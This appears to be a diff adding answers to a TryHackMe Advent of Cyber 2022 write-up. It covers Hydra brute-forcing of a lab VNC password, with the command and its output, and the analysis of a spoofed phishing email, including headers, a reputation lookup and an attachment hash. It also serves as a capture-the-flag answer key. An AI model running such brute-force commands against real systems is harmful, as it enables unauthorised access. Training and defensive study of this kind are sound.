@@ -57,7 +57,116 @@
     ```
     - What is the password for the username santahr? `santa25`
     - If you want to learn more scanning techniques, we have a module dedicated to Nmap! `No Answer Needed`
+
 + Task 10  [Day 5] Brute-Forcing He knows when you're awake
-    - Use Hydra to find the VNC password of the target with IP address MACHINE_IP. What is the password?
-    - Using a VNC client on the AttackBox, connect to the target of IP address 10.10.250.207. What is the flag written on the target’s screen?
-    - If you liked the topics presented in this task, check out these rooms next: Protocols and Servers 2, Hydra, Password Attacks, John the Ripper.
+    - Use Hydra to find the VNC password of the target with IP address MACHINE_IP. What is the password? `1q2w3e4r`
+    ```bash
+    hydra -P /usr/share/wordlists/rockyou.txt 10.10.252.252 vnc
+    [ATTEMPT] target 10.10.252.252 - login "" - pass "ghetto" - 1163 of 14344398 [child 13] (0/0)
+    [5900][vnc] host: 10.10.252.252   password: 1q2w3e4r
+    [ATTEMPT] target 10.10.252.252 - login "" - pass "asdfg" - 1164 of 14344398 [child 12] (0/0)
+    ```
+    - Using a VNC client on the AttackBox, connect to the target of IP address 10.10.250.207. What is the flag written on the target’s screen? `THM{I_SEE_YOUR_SCREEN}`
+    - If you liked the topics presented in this task, check out these rooms next: Protocols and Servers 2, Hydra, Password Attacks, John the Ripper. `No Answer Needed`
+
++ Task 11  [Day 6] Email Analysis It's beginning to look a lot like phishing
+    
+    ```bash
+    ubuntu@ip-10-10-95-118:~/Desktop$ emlAnalyzer -i Urgent\:.eml --header --html -u --text --extract-all
+     ==============
+    ||  Header  ||
+    ==============
+    X-Pm-Content-Encryption.....end-to-end
+    X-Pm-Origin.................internal
+    Subject.....................Urgent: Blue section is down. Switch to the load share plan!
+    From........................Chief Elf <chief.elf@santaclaus.thm>
+    Date........................Tue, 6 Dec 2022 00:00:01 +0000
+    Mime-Version................1.0
+    Content-Type................multipart/mixed;boundary=---------------------03edd9c682a0c8f60d54b9e4bb86659f
+    To..........................elves.all@santaclaus.thm <elves.all@santaclaus.thm>
+    X-Attached..................Division_of_labour-Load_share_plan.doc
+    Message-Id..................<QW9DMjAyMl9FbWFpbF9BbmFseXNpcw==>
+    X-Pm-Spamscore..............3
+    Received....................from mail.santaclaus.thm by mail.santaclaus.thm; Tue, 6 Dec 2022 00:00:01 +0000
+    X-Original-To...............elves.all@santaclaus.thm
+    Return-Path.................<murphy.evident@bandityeti.thm>
+    Delivered-To................elves.all@santaclaus.thm
+
+    =========================
+    ||  URLs in HTML part  ||
+    =========================
+    [+] No URLs found in the html
+
+    =================
+    ||  Plaintext  ||
+    =================
+    [+] Email contains no plaintext
+
+    ============
+    ||  HTML  ||
+    ============
+    <span>Dear Elves,</span><div><br></div><div><span>Due to technical problems in the blue section of our toy factory, we are having difficulties preparing some toys. </span></div><div><br></div><div><span>There
+    are a few days left to Christmas, so we need to use time efficiently to
+    prepare every wishlist we receive. Due to that, the blue section's 
+    workload is shared with the rest to avoid any toy production delay.</span></div><div><br></div><div><span>The detailed division of labour is included in the attached document.</span></div><div><br></div><div><span>Good luck to you all.</span></div><div><br></div><div><b><span>Chief Elf</span></b></div><div><br></div>
+
+    =============================
+    ||  Attachment Extracting  ||
+    =============================
+    [+] Attachment [1] "Division_of_labour-Load_share_plan.doc" extracted to eml_attachments/Division_of_labour-Load_share_plan.doc
+
+    ```
+    - What is the email address of the sender? `chief.elf@santaclaus.thm`
+    - What is the return address? `murphy.evident@bandityeti.thm`
+    - On whose behalf was the email sent? `Chief Elf`
+    - What is the X-spam score? `3`
+    - What is hidden in the value of the Message-ID field? `AoC2022_Email_Analysis`
+    - What is the reputation result of the sender's email address? `RISKY`
+    ```bash
+    hengkisirait: TryHackMe $ curl emailrep.io/chief.elf@santaclaus.thm
+    {
+    "email": "chief.elf@santaclaus.thm",
+    "reputation": "none",
+    "suspicious": true,
+    "references": 0,
+    "details": {
+        "blacklisted": false,
+        "malicious_activity": false,
+        "malicious_activity_recent": false,
+        "credentials_leaked": false,
+        "credentials_leaked_recent": false,
+        "data_breach": false,
+        "first_seen": "never",
+        "last_seen": "never",
+        "domain_exists": true,
+        "domain_reputation": "low",
+        "new_domain": false,
+        "days_since_domain_creation": null,
+        "suspicious_tld": false,
+        "spam": false,
+        "free_provider": false,
+        "disposable": false,
+        "deliverable": false,
+        "accept_all": false,
+        "valid_mx": false,
+        "primary_mx": "",
+        "spoofable": true,
+        "spf_strict": false,
+        "dmarc_enforced": false,
+        "profiles": []
+    }
+    }%
+    ```
+    - What is the filename of the attachment? `Division_of_labour-Load_share_plan.doc`
+    - What is the hash value of the attachment? `0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467`
+    ```bash
+    ubuntu@ip-10-10-95-118:~/Desktop/eml_attachments$ sha256sum Division_of_labour-Load_share_plan.doc 
+    0827bb9a2e7c0628b82256759f0f888ca1abd6a2d903acdb8e44aca6a1a03467  Division_of_labour-Load_share_plan.doc
+    ```
+    - What is the second tactic marked in the Mitre ATT&CK section? `Defense Evasion`
+    - What is the subcategory of the file? `macro_hunter`
+    - If you want to learn more about phishing and analysing emails, check out the Phishing module! `No Answer Needed`
+
++ Task 12  [Day 7] CyberChef Maldocs roasting on an open fire
+    - 
+    
